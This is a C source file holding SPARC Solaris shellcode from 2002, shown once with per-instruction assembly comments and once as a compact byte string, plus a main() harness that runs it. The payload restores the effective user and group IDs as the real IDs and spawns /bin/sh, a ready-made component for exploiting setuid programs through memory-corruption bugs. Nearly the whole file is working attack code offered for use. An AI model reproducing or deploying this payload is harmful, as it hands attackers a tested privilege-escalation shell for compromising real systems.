/*
 * Solaris shellcode - setreuid(geteuid()), setregid(getegid()), execve /bin/sh
 *
 * Claes M. Nyberg 20020124
 * ,
 */

#include

static char solaris_code[] =

            /* geteuid() */
    "\x82\x10\x20\x18"   /* mov     24, %g1              */
    "\x91\xd0\x20\x08"   /* ta      0x8                  */
    "\x90\x02\x60\x01"   /* add     %o1, 1, %o0          */

            /* setreuid() */
    "\x90\x22\x20\x01"   /* sub     %o0, 1, %o0          */
    "\x92\x10\x3f\xff"   /* mov     -1, %o1              */
    "\x82\x10\x20\xca"   /* mov     202, %g1             */
    "\x91\xd0\x20\x08"   /* ta      0x8                  */

            /* getegid() */
    "\x82\x10\x20\x2f"   /* mov     47, %g1              */
    "\x91\xd0\x20\x08"   /* ta      0x8                  */
    "\x90\x02\x60\x01"   /* add     %o1, 1, %o0          */

            /* setregid() */
    "\x90\x22\x20\x01"   /* sub     %o0, 1, %o0          */
    "\x92\x10\x3f\xff"   /* mov     -1, %o1              */
    "\x82\x10\x20\xcb"   /* mov     203, %g1             */
    "\x91\xd0\x20\x08"   /* ta      0x8                  */

            /* execve(/bin/sh ..) */
    "\x94\x1a\x80\x0a"   /* xor     %o2, %o2, %o2        */
    "\x21\x0b\xd8\x9a"   /* sethi   %hi(0x2f626800), %l0 */
    "\xa0\x14\x21\x6e"   /* or      %l0, 0x16e, %l0      */
    "\x23\x0b\xcb\xdc"   /* sethi   %hi(0x2f2f7000), %l1 */
    "\xa2\x14\x63\x68"   /* or      %l1, 0x368, %l1      */
    "\xd4\x23\xbf\xfc"   /* st      %o2, [%sp - 4]       */
    "\xe2\x23\xbf\xf8"   /* st      %l1, [%sp - 8]       */
    "\xe0\x23\xbf\xf4"   /* st      %l0, [%sp - 12]      */
    "\x90\x23\xa0\x0c"   /* sub     %sp, 12, %o0         */
    "\xd4\x23\xbf\xf0"   /* st      %o2, [%sp - 16]      */
    "\xd0\x23\xbf\xec"   /* st      %o0, [%sp - 20]      */
    "\x92\x23\xa0\x14"   /* sub     %sp, 20, %o1         */
    "\x82\x10\x20\x3b"   /* mov     59, %g1              */
    "\x91\xd0\x20\x08"   /* ta      0x8                  */

            /* exit() */
    "\x82\x10\x20\x01"   /* mov     1, %g1               */
    "\x91\xd0\x20\x08";  /* ta      0x8                  */


static char _solaris_code[] =
	"\x82\x10\x20\x18\x91\xd0\x20\x08\x90\x02\x60\x01\x90\x22"
	"\x20\x01\x92\x10\x3f\xff\x82\x10\x20\xca\x91\xd0\x20\x08"
	"\x82\x10\x20\x2f\x91\xd0\x20\x08\x90\x02\x60\x01\x90\x22"
	"\x20\x01\x92\x10\x3f\xff\x82\x10\x20\xcb\x91\xd0\x20\x08"
	"\x94\x1a\x80\x0a\x21\x0b\xd8\x9a\xa0\x14\x21\x6e\x23\x0b"
	"\xcb\xdc\xa2\x14\x63\x68\xd4\x23\xbf\xfc\xe2\x23\xbf\xf8"
	"\xe0\x23\xbf\xf4\x90\x23\xa0\x0c\xd4\x23\xbf\xf0\xd0\x23"
	"\xbf\xec\x92\x23\xa0\x14\x82\x10\x20\x3b\x91\xd0\x20\x08"
	"\x82\x10\x20\x01\x91\xd0\x20\x08";

int
main(void)
{
    void (*code)() = (void *)_solaris_code;
    printf("Shellcode length: %d\n", strlen(_solaris_code));
    code();
    return(1);
}